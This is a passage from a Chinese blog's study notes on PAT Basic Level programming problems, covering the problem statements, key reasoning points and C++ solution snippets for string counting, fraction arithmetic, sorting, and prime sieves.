<li>字符串中必须仅有 <code>P</code>、 <code>A</code>、 <code>T</code>这三种字符，不可以包含其它字符；</li>
<li>任意形如 <code>xPATx</code> 的字符串都可以获得“<strong>答案正确</strong>”，其中 <code>x</code> 或者是空字符串，或者是仅由字母 A 组成的字符串；</li>
<li>如果 <code>aPbTc</code> 是正确的，那么 <code>aPbATca</code> 也是正确的，其中 <code>a</code>、 <code>b</code>、 <code>c</code> 均或者是空字符串，或者是仅由字母 A 组成的字符串。<br>现在就请你为 PAT 写一个自动裁判程序，判定哪些字符串是可以获得“<strong>答案正确</strong>”的。</li>
</ol>
<p><strong>输入格式：</strong><br>每个测试输入包含 1 个测试用例。第 1 行给出一个正整数 $n (&lt;10)$，是需要检测的字符串个数。接下来每个字符串占一行，字符串长度不超过 100，且不包含空格。</p>
<p><strong>输出格式：</strong><br>每个字符串的检测结果占一行，如果该字符串可以获得“答案正确”，则输出 <code>YES</code>，否则输出 <code>NO</code>。</p>
<p><strong>输入样例：</strong></p>
<blockquote>
<p>8<br>PAT<br>PAAT<br>AAPATAA<br>AAPAATAAAA<br>xPATx<br>PT<br>Whatever<br>APAAATAA</p>
</blockquote>
<p><strong>输出样例：</strong></p>
<blockquote>
<p>YES<br>YES<br>YES<br>YES<br>NO<br>NO<br>NO<br>NO</p>
</blockquote>
<h3 id="关键点-6"><a href="#关键点-6" class="headerlink" title="关键点"></a>关键点</h3><p>如何理解3个条件:<br><strong>1. 字符串中必须仅有 <code>P</code>、 <code>A</code>、 <code>T</code>这三种字符，不可以包含其它字符；</strong></p>
<p>应该保证只含有这三个字符，map可以解决。</p>
<p><strong>2. 任意形如 <code>xPATx</code> 的字符串都可以获得“</strong>答案正确<strong>”，其中 <code>x</code> 或者是空字符串，或者是仅由字母 A 组成的字符串；</strong></p>
<p>也就是<code>PAT</code>一定是满足的，在此基础上，<code>APATA</code>,<code>AAPATAA</code>,<code>AAAPATAAA</code>,……等均满足。</p>
<p><strong>3. 如果 <code>aPbTc</code> 是正确的，那么 <code>aPbATca</code> 也是正确的，其中 <code>a</code>、 <code>b</code>、 <code>c</code> 均或者是空字符串，或者是仅由字母 A 组成的字符串。</strong></p>
<p>由于条件1、2限制，最少的符合是<code>PAT</code>形式，那么：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">PAT      a:空    b:A     c:空</span><br><span class="line">PAAT     a:空    b:AA    c:空</span><br><span class="line">PAAAT    a:空    b:AA    c:空</span><br><span class="line">……</span><br></pre></td></tr></table></figure>
<p>满足条件3，正确。随后当a和c不为空，首先应该满足条件2，然后运用条件3，以<code>AAPATAA</code>为例：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">AAPATAA       a:AA    b:A     c:AA      条件<span class="number">2</span></span><br><span class="line">AAPAATAAAA    a:AA    b:AA    c:AAAA    条件<span class="number">3</span></span><br></pre></td></tr></table></figure>
<p>接下来列出整个集合表示，来找规律。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">APATA    AAPATAA    AAAPATAAA    ……    条件<span class="number">2</span></span><br><span class="line">APAATAA    AAPAATAAAA    AAAPAATAAAAAA    ……    条件<span class="number">3</span></span><br><span class="line">APAAATAAA    AAPAAATAAAAAA    AAAPAAATAAAAAAAAA    ……    条件<span class="number">3</span></span><br></pre></td></tr></table></figure>
<p>我们发现，<code>PT</code>之间每次加一个<code>A</code>，<code>T</code>后面要加一个<code>a</code>，所以可以总结一个规律：<strong>P前A的个数×PT之间A的个数 = T后A的个数</strong>，进而转化成数学乘法问题，而不需要每次去判断是不是PAT。</p>
<hr>
<h2 id="1034-有理数四则运算-（20-分）"><a href="#1034-有理数四则运算-（20-分）" class="headerlink" title="1034 有理数四则运算 （20 分）"></a>1034 有理数四则运算 （20 分）</h2><p>本题要求编写程序，计算 2 个有理数的和、差、积、商。<br><strong>输入格式：</strong><br>输入在一行中按照 <code>a1/b1 a2/b2</code> 的格式给出两个分数形式的有理数，其中分子和分母全是整型范围内的整数，负号只可能出现在分子前，分母不为 0。</p>
<p><strong>输出格式：</strong><br>分别在 4 行中按照 <code>有理数1 运算符 有理数2 = 结果</code> 的格式顺序输出 2 个有理数的和、差、积、商。注意输出的每个有理数必须是该有理数的最简形式 <code>k a/b</code>，其中 <code>k</code> 是整数部分，<code>a/b</code> 是最简分数部分；若为负数，则须加括号；若除法分母为 0，则输出 <code>Inf</code>。题目保证正确的输出中没有超过整型范围的整数。<br><strong>输入样例 1：</strong></p>
<blockquote>
<p>2/3 -4/2</p>
</blockquote>
<p><strong>输出样例 1：</strong></p>
<blockquote>
<p>2/3 + (-2) = (-1 1/3)<br>2/3 - (-2) = 2 2/3<br>2/3 * (-2) = (-1 1/3)<br>2/3 / (-2) = (-1/3)</p>
</blockquote>
<p><strong>输入样例 2：</strong></p>
<blockquote>
<p>5/3 0/6</p>
</blockquote>
<p><strong>输出样例 2：</strong></p>
<blockquote>
<p>1 2/3 + 0 = 1 2/3<br>1 2/3 - 0 = 1 2/3<br>1 2/3 * 0 = 0<br>1 2/3 / 0 = Inf</p>
</blockquote>
<h3 id="注意点-4"><a href="#注意点-4" class="headerlink" title="注意点"></a>注意点</h3><ul>
<li>使用分数的固定加减乘除的形式，问题会变得很简单。但是代码会相对较长，不能着急。</li>
</ul>
<p><strong>分数部分代码</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="comment">/*最小公约数*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">gcd</span><span class="params">(ll a,ll b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> b == <span class="number">0</span> ? a : gcd(b, a%b);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">struct</span> Fraction&#123;</span><br><span class="line">    ll up;</span><br><span class="line">    ll down;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/*分数化简*/</span></span><br><span class="line"><span class="function">Fraction <span class="title">reduction</span><span class="params">(Fraction result)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (result.down &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        result.up = -result.up;</span><br><span class="line">        result.down = -result.down;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (result.up == <span class="number">0</span>)&#123;</span><br><span class="line">        result.down = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">int</span> d = gcd(<span class="built_in">abs</span>(result.up), <span class="built_in">abs</span>(result.down));</span><br><span class="line">        result.up /= d;</span><br><span class="line">        result.down /= d;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*分数加法*/</span></span><br><span class="line"><span class="function">Fraction <span class="title">add</span><span class="params">(Fraction f1, Fraction f2)</span></span>&#123;</span><br><span class="line">    Fraction result;</span><br><span class="line">    result.up = f1.up*f2.down + f2.up*f1.down;</span><br><span class="line">    result.down = f1.down*f2.down;</span><br><span class="line">    <span class="keyword">return</span> reduction(result);<span class="comment">//结果别忘了化简</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*分数减法*/</span></span><br><span class="line"><span class="function">Fraction <span class="title">sub</span><span class="params">(Fraction f1, Fraction f2)</span></span>&#123;</span><br><span class="line">    Fraction result;</span><br><span class="line">    result.up = f1.up*f2.down - f2.up*f1.down;</span><br><span class="line">    result.down = f1.down*f2.down;</span><br><span class="line">    <span class="keyword">return</span> reduction(result);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*分数乘法*/</span></span><br><span class="line"><span class="function">Fraction <span class="title">mult</span><span class="params">(Fraction f1, Fraction f2)</span></span>&#123;</span><br><span class="line">    Fraction result;</span><br><span class="line">    result.up = f1.up*f2.up;</span><br><span class="line">    result.down = f1.down*f2.down;</span><br><span class="line">    <span class="keyword">return</span> reduction(result);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*分数除法*/</span></span><br><span class="line"><span class="function">Fraction <span class="title">divd</span><span class="params">(Fraction f1, Fraction f2)</span></span>&#123;</span><br><span class="line">    Fraction result;</span><br><span class="line">    result.up = f1.up*f2.down;</span><br><span class="line">    result.down = f1.down*f2.up;</span><br><span class="line">    <span class="keyword">return</span> reduction(result);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">(Fraction f)</span></span>&#123;</span><br><span class="line">    f = reduction(f);</span><br><span class="line">    <span class="keyword">if</span> (f.up &lt; <span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">"("</span>);</span><br><span class="line">    <span class="keyword">if</span> (f.down == <span class="number">1</span>)&#123;<span class="comment">//f.down == 1：既判断了0，也判断了正数</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%lld"</span>,f.up);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">abs</span>(f.up) &gt; <span class="built_in">abs</span>(f.down))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%lld"</span>, f.up / f.down);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">" %lld/%lld"</span>, <span class="built_in">abs</span>(f.up%f.down), f.down);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%lld/%lld"</span>, f.up, f.down);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (f.up &lt; <span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">")"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="1040-有几个PAT-（25-分）"><a href="#1040-有几个PAT-（25-分）" class="headerlink" title="1040 有几个PAT （25 分）"></a>1040 有几个PAT （25 分）</h2><p>字符串 <code>APPAPT</code> 中包含了两个单词 <code>PAT</code>，其中第一个 <code>PAT</code> 是第 2 位(<code>P</code>)，第 4 位(<code>A</code>)，第 6 位(<code>T</code>)；第二个 PAT 是第 3 位(<code>P</code>)，第 4 位(<code>A</code>)，第 6 位(<code>T</code>)。<br>现给定字符串，问一共可以形成多少个 <code>PAT</code>？<br><strong>输入格式：</strong><br>输入只有一行，包含一个字符串，长度不超过$10^5$，只包含 <code>P</code>、<code>A</code>、<code>T</code> 三种字母。<br><strong>输出格式：</strong><br>在一行中输出给定字符串中包含多少个 <code>PAT</code>。由于结果可能比较大，只输出对 1000000007 取余数的结果。<br><strong>输入样例：</strong></p>
<blockquote>
<p>APPAPT</p>
</blockquote>
<p><strong>输出样例：</strong></p>
<blockquote>
<p>2</p>
</blockquote>
<h3 id="关键点-7"><a href="#关键点-7" class="headerlink" title="关键点"></a>关键点</h3><ul>
<li>暴力破解是不可能暴力的，这辈子都不会暴力的。还是分析下他的数学规律吧。</li>
<li>首先，应该看到它的有序型，PAT是分先后顺序的，有点动态规划的意思，也就是，没遇到A前，P个数是被统计的，A以后的P是遇到下一个A才会被统计。考虑<code>APAPAT</code>返回应该是3。所以有每次遇到A前，统计P个数；遇到A时，应统计PA个数，也就是之前的PA和当前组成PA的个数；遇到T时，应统计PAT个数，也就是之前的PAT和当前PAT个数。</li>
</ul>
<p><strong>完整代码</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">100010</span>;</span><br><span class="line"><span class="keyword">char</span> ch[maxn];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>,ch);</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(ch);</span><br><span class="line">    <span class="keyword">int</span> res = <span class="number">0</span>, P = <span class="number">0</span>, PA = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (ch[i] == <span class="string">'P'</span>) P++;</span><br><span class="line">        <span class="keyword">if</span> (ch[i] == <span class="string">'A'</span>) PA = (PA + P) % <span class="number">1000000007</span>;<span class="comment">//这里很巧妙地解决了PA的顺序出现。要慢慢理解</span></span><br><span class="line">        <span class="keyword">if</span> (ch[i] == <span class="string">'T'</span>) res = (res + PA) % <span class="number">1000000007</span>;<span class="comment">//这里很巧妙地解决了PAT的顺序出现。</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,res);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="1045-快速排序-（25-分）"><a href="#1045-快速排序-（25-分）" class="headerlink" title="1045 快速排序 （25 分）"></a>1045 快速排序 （25 分）</h2><p>著名的快速排序算法里有一个经典的划分过程：我们通常采用某种方法取一个元素作为主元，通过交换，把比主元小的元素放到它的左边，比主元大的元素放到它的右边。 给定划分后的 N 个互不相同的正整数的排列，请问有多少个元素可能是划分前选取的主元？<br>例如给定 $N = 5$, 排列是1、3、2、4、5。则：</p>
<ul>
<li>1 的左边没有元素，右边的元素都比它大，所以它可能是主元；</li>
<li>尽管 3 的左边元素都比它小，但其右边的 2 比它小，所以它不能是主元；</li>
<li>尽管 2 的右边元素都比它大，但其左边的 3 比它大，所以它不能是主元；</li>
<li>类似原因，4 和 5 都可能是主元。</li>
</ul>
<p>因此，有 3 个元素可能是主元。<br><strong>输入格式：</strong><br>输入在第 1 行中给出一个正整数 $N（≤10^5）$； 第 2 行是空格分隔的 N 个不同的正整数，每个数不超过 $10^9$。<br><strong>输出格式：</strong><br>在第 1 行中输出有可能是主元的元素个数；在第 2 行中按递增顺序输出这些元素，其间以 1 个空格分隔，行首尾不得有多余空格。<br><strong>输入样例：</strong></p>
<blockquote>
<p>5<br>1 3 2 4 5</p>
</blockquote>
<p><strong>输出样例：</strong></p>
<blockquote>
<p>3<br>1 4 5</p>
</blockquote>
<h3 id="关键点-8"><a href="#关键点-8" class="headerlink" title="关键点"></a>关键点</h3><ul>
<li><p>这个和B1040都是动态规划类似问题，需要想清楚所需前置结果。</p>
</li>
<li><p><strong>这里再建立两个数组，分别存储每一个数字的前i-1项的最大值和后n-i项的最小值，这样可以利用动态规划的思想，分别建立这两个数组。</strong></p>
</li>
</ul>
<p><strong>部分实现</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">leftMax[<span class="number">0</span>] = a[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; N; i++)&#123;<span class="comment">//用于存储每一个数字左边的最大值</span></span><br><span class="line">leftMax[i] = a[i] &gt; leftMax[i - <span class="number">1</span>] ? a[i] : leftMax[i - <span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line">rightMin[N - <span class="number">1</span>] = a[N - <span class="number">1</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = N - <span class="number">2</span>; i &gt;= <span class="number">0</span>; i--)&#123;<span class="comment">//用于存储每一个数字右边的最小值</span></span><br><span class="line">rightMin[i] = a[i] &lt; rightMin[i + <span class="number">1</span>] ? a[i] : rightMin[i + <span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>然后即可直接比较得出结果，这里题目虽然要求有序，但是，仔细想想，这样得到的结果就是有序的，因为，如果无序，那么他肯定不满足左小右大这个条件的。</li>
</ul>
<hr>
<h2 id="1049-数列的片段和-（20-分）"><a href="#1049-数列的片段和-（20-分）" class="headerlink" title="1049 数列的片段和 （20 分）"></a>1049 数列的片段和 （20 分）</h2><p>给定一个正数数列，我们可以从中截取任意的连续的几个数，称为片段。例如，给定数列 <code>{ 0.1, 0.2, 0.3, 0.4 }</code>，我们有 <code>(0.1) (0.1, 0.2) (0.1, 0.2, 0.3) (0.1, 0.2, 0.3, 0.4) (0.2) (0.2, 0.3) (0.2, 0.3, 0.4) (0.3) (0.3, 0.4) (0.4)</code> 这 10 个片段。<br>给定正整数数列，求出全部片段包含的所有的数之和。如本例中 10 个片段总和是 <code>0.1 + 0.3 + 0.6 + 1.0 + 0.2 + 0.5 + 0.9 + 0.3 + 0.7 + 0.4 = 5.0</code>。<br><strong>输入格式：</strong><br>输入第一行给出一个不超过 $10^5$的正整数 N，表示数列中数的个数，第二行给出 N 个不超过 1.0 的正数，是数列中的数，其间以空格分隔。<br><strong>输出格式：</strong><br>在一行中输出该序列所有片段包含的数之和，精确到小数点后 2 位。<br><strong>输入样例：</strong></p>
<blockquote>
<p>4<br>0.1 0.2 0.3 0.4</p>
</blockquote>
<p><strong>输出样例：</strong></p>
<blockquote>
<p>5.00</p>
</blockquote>
<h3 id="关键点-9"><a href="#关键点-9" class="headerlink" title="关键点"></a>关键点</h3><p>需要发现规律，如果全部找出在计算，三层循环肯定超时。动态规划我没有考虑。分析如下，假设5个数，（用整数代替小数便于观看）：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"> <span class="number">1</span>      <span class="number">2</span>        <span class="number">3</span>          <span class="number">4</span>            <span class="number">5</span></span><br><span class="line">(<span class="number">1</span>)    (<span class="number">1</span> <span class="number">2</span>)    (<span class="number">1</span> <span class="number">2</span> <span class="number">3</span>)    (<span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span>)    (<span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span>)  <span class="number">1</span>:<span class="number">5</span>次(N*<span class="number">1</span>)</span><br><span class="line">(<span class="number">2</span>)    (<span class="number">2</span> <span class="number">3</span>)    (<span class="number">2</span> <span class="number">3</span> <span class="number">4</span>)    (<span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span>)                 <span class="number">2</span>:<span class="number">4</span>+<span class="number">4</span>=<span class="number">8</span>次((N<span class="number">-1</span>)*<span class="number">2</span>)</span><br><span class="line">(<span class="number">3</span>)    (<span class="number">3</span> <span class="number">4</span>)    (<span class="number">3</span> <span class="number">4</span> <span class="number">5</span>)                              <span class="number">3</span>:<span class="number">3</span>+<span class="number">3</span>+<span class="number">3</span>=<span class="number">9</span>次((N<span class="number">-2</span>)*<span class="number">3</span>)</span><br><span class="line">(<span class="number">4</span>)    (<span class="number">4</span> <span class="number">5</span>)                                         <span class="number">4</span>:<span class="number">2</span>*<span class="number">4</span>=<span class="number">8</span>次((N<span class="number">-3</span>)*<span class="number">4</span>)</span><br><span class="line">(<span class="number">5</span>)                                                  <span class="number">5</span>:<span class="number">1</span>*<span class="number">5</span>=<span class="number">5</span>次((N<span class="number">-4</span>)*<span class="number">5</span>)</span><br></pre></td></tr></table></figure>
<p>根据这个枚举，很容易发现规律，<strong>对于每一个元素i，出现次数为(N-i+1)*i次。</strong></p>
<h3 id="注意点-5"><a href="#注意点-5" class="headerlink" title="注意点"></a>注意点</h3><p>一直有两个点不过，将所有的数据类型全部改为double类型，通过了。<strong>说明是类型或者基本可以感觉到是溢出问题</strong>。<br>为什么会溢出呢？${10^5}^2$=${10^{10}}$ = 100亿超过了int范围。其实这个极限在i=N/2的时候取到的，此时<strong>(N-i+1)*i</strong>最大，当$N=10^5$，则$i=2.5^5$，则$(N - i + 1)*i≈2.5^{10}$超过了int范围。</p>
<hr>
<h2 id="1051-复数乘法-（15-分）"><a href="#1051-复数乘法-（15-分）" class="headerlink" title="1051 复数乘法 （15 分）"></a>1051 复数乘法 （15 分）</h2><p>复数可以写成 (A+Bi) 的常规形式，其中 A 是实部，B 是虚部，i 是虚数单位，满足$i^2=−1$；也可以写成极坐标下的指数形式 $(R×e^{(Pi)})$，其中 R 是复数模，P 是辐角，i 是虚数单位，其等价于三角形式 $(R(cos(P)+isin(P))$。<br>现给定两个复数的 R 和 P，要求输出两数乘积的常规形式。<br><strong>输入格式：</strong><br>输入在一行中依次给出两个复数的 R1,P1,R2,P2，数字间以空格分隔。<br><strong>输出格式：</strong><br>在一行中按照 <code>A+Bi</code> 的格式输出两数乘积的常规形式，实部和虚部均保留 2 位小数。注意：如果 <code>B</code> 是负数，则应该写成 <code>A-|B|i</code> 的形式。<br><strong>输入样例：</strong></p>
<blockquote>
<p>2.3 3.5 5.2 0.4</p>
</blockquote>
<p><strong>输出样例：</strong></p>
<blockquote>
<p>-8.68-8.23i</p>
</blockquote>
<h3 id="关键点-10"><a href="#关键点-10" class="headerlink" title="关键点"></a>关键点</h3><ol>
<li>题目的理解，需要你借助函数cos()和sin()来处理(R(cos(P)+isin(P))，由于计算乘法，那就使用乘法分配律。</li>
</ol>
<p>$(R1(cos(P1)+isin(P1)) <em> (R2(cos(P2)+isin(P2)) = $<br>$R1R2cos(P1)cos(P2)+i^2</em>R1R2sin(P1)sin(P2)+i*(R1R2sin(P1)cos(P2)+R1R2cos(P1)sin(P2))$<br>为<code>(A+Bi)</code> 形式，且$i^2=-1$，所以可以分别计算A和B的值。</p>
<ol>
<li>边界检测。因为保留2位小数，且double的舍入是符合四舍五入的。计算结果A和B可能为小于0.005的小数，因为0.005会舍入为0.01；-0.004会被舍入为-0.00，其实负号是多余的，所以应该对abs(A)判断是否小于0.005，来决定是否直接输出0.00。另外，对B的判断，要比A多了一个加号的判断，因为其前不会自动加<code>+</code>号。</li>
</ol>
<h2 id="1060-爱丁顿数-（25-分）"><a href="#1060-爱丁顿数-（25-分）" class="headerlink" title="1060 爱丁顿数 （25 分）"></a>1060 爱丁顿数 （25 分）</h2><p>英国天文学家爱丁顿很喜欢骑车。据说他为了炫耀自己的骑车功力，还定义了一个“爱丁顿数” E ，即满足有 E 天骑车超过 E 英里的最大整数 E。据说爱丁顿自己的 E 等于87。<br>现给定某人 N 天的骑车距离，请你算出对应的爱丁顿数 $E（≤N）$。<br><strong>输入格式：</strong><br>输入第一行给出一个正整数 $N (≤10^5)$，即连续骑车的天数；第二行给出 N 个非负整数，代表每天的骑车距离。<br><strong>输出格式：</strong><br>在一行中给出 N 天的爱丁顿数。<br><strong>输入样例：</strong></p>
<blockquote>
<p>10<br>6 7 6 9 3 10 8 2 7 8</p>
</blockquote>
<p><strong>输出样例：</strong></p>
<blockquote>
<p>6</p>
</blockquote>
<h3 id="关键点-11"><a href="#关键点-11" class="headerlink" title="关键点"></a>关键点</h3><ul>
<li><p>首先要知道这道题要排序，如果不知道排序，那么就在做不了。</p>
</li>
<li><p>排序后，其实就已经可以按照题目要求直接去找爱丁顿数了。</p>
</li>
<li><p>但这不是最优解，理论上你要发现它的规律，是去找从大到小排序<code>(1~N)</code>中<code>a[i]&gt;i</code>的最后一次出现的i。</p>
</li>
</ul>
<p><strong>不用发现规律</strong></p>
<ul>
<li>虽然可以这么做，但是，需要优化一个地方，不容易去找，不过，好就好在如果看不到规律，这个方法还是不错的。</li>
<li>主要思路，是直接模拟，并用倒着判断的方法去优化。</li>
</ul>
<p><strong>发现规律</strong></p>
<ul>
<li>一旦看到了规律，这个题目就已经失去意义了。<br><strong>分析：</strong>从下标1开始存储n天的公里数在数组a中，对n个数据从大到小排序，i表示了骑车的天数，那么满足$a[i] &gt; i$的最大值即为所求。</li>
</ul>
<hr>
<h2 id="1062-最简分数-（20-分）"><a href="#1062-最简分数-（20-分）" class="headerlink" title="1062 最简分数 （20 分）"></a>1062 最简分数 （20 分）</h2><p>一个分数一般写成两个整数相除的形式：$N/M$，其中 M 不为0。最简分数是指分子和分母没有公约数的分数表示形式。<br>现给定两个不相等的正分数 $N_1/M_1$ 和 $N_2/M_2$，要求你按从小到大的顺序列出它们之间分母为 K 的最简分数。<br><strong>输入格式：</strong><br>输入在一行中按 N/M 的格式给出两个正分数，随后是一个正整数分母 K，其间以空格分隔。题目保证给出的所有整数都不超过 1000。<br><strong>输出格式：</strong><br>在一行中按 N/M 的格式列出两个给定分数之间分母为 K 的所有最简分数，按从小到大的顺序，其间以 1 个空格分隔。行首尾不得有多余空格。题目保证至少有 1 个输出。</p>
<p><strong>输入样例：</strong></p>
<blockquote>
<p>7/18 13/20 12</p>
</blockquote>
<p><strong>输出样例：</strong></p>
<blockquote>
<p>5/12 7/12</p>
</blockquote>
<h3 id="注意点-6"><a href="#注意点-6" class="headerlink" title="注意点"></a>注意点</h3><ul>
<li><p><strong>对于分数的判断，不能局限于计算小数比较，因为除不尽会出现精度问题，所以应该利用乘法来解决大小问题。</strong></p>
</li>
<li><p>此处给出的分数大小不一定是正序，需要调整顺序。就可以利用乘法性质。</p>
</li>
<li><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (n1*m2 &gt; n2*m1)&#123;</span><br><span class="line">    swap(n1,n2);</span><br><span class="line">    swap(m1, m2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>猜测：一直想不通的点，我一直用除法来解决边界问题，这样其实并不好，在一定程度上会出现小数精度不够，所以用乘法来解决分数的大小比较。</p>
</li>
</ul>
<hr>
<h1 id="类型十二：素数"><a href="#类型十二：素数" class="headerlink" title="类型十二：素数"></a>类型十二：素数</h1><ul>
<li><p>素数的判断</p>
</li>
<li><p>素数表的生成</p>
</li>
</ul>
<h2 id="素数的判断"><a href="#素数的判断" class="headerlink" title="素数的判断"></a>素数的判断</h2><ul>
<li>不需要全部判断，只需要判断2~$\sqrt{x}$是否被整除，就可以判断是否为素数了。</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isPrime</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (x &lt; <span class="number">2</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i*i &lt;= x; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (x % i == <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="素数表的生成"><a href="#素数表的生成" class="headerlink" title="素数表的生成"></a>素数表的生成</h2><p><code>埃拉托斯特尼筛法</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*生成前100100个素数，需要测试的前面10000000一千万个数！ */</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">10000000</span>;</span><br><span class="line"><span class="keyword">bool</span> isPrime[maxn] = &#123;&#125;;</span><br><span class="line"><span class="keyword">int</span> prime[<span class="number">100100</span>] = &#123;&#125;;</span><br><span class="line"><span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getPrime</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt; maxn&amp;&amp;len &lt; <span class="number">100100</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (!isPrime[i])&#123;</span><br><span class="line">            prime[len++] = i;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = i+i; j &lt; maxn; j+=i)&#123;</span><br><span class="line">                isPrime[j] = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>典型题目（不难）</strong></p>
<table>
<thead>
<tr>
<th style="text-align:center">题号</th>
<th style="text-align:center">题目</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">B1007</td>
<td style="text-align:center">素数对猜想 （20 分）</td>
<td style="text-align:center">素数表的生成，注意取值范围</td>
</tr>
<tr>
<td style="text-align:center">B1013</td>
<td style="text-align:center">数素数 （20 分）</td>
<td style="text-align:center">素数表的生成，注意取值范围</td>
</tr>
<tr>
<td style="text-align:center">B1094</td>
<td style="text-align:center">谷歌的招聘 （20 分）</td>
<td style="text-align:center">边界检测(long long)，输出格式</td>
</tr>
</tbody>
</table>
<hr>
<h1 id="类型十三：大整数运算"><a href="#类型十三：大整数运算" class="headerlink" title="类型十三：大整数运算"></a>类型十三：大整数运算</h1><ul>
<li>主要以数组形式的大整数的进位加减运算。</li>
</ul>
<p><strong>典型题目（不难）</strong></p>
<table>
<thead>
<tr>
<th style="text-align:center">题号</th>
<th style="text-align:center">题目</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">B1017</td>
<td style="text-align:center">A除以B （20 分）</td>
<td style="text-align:center">边界检测</td>
</tr>
<tr>
<td style="text-align:center">B1079</td>
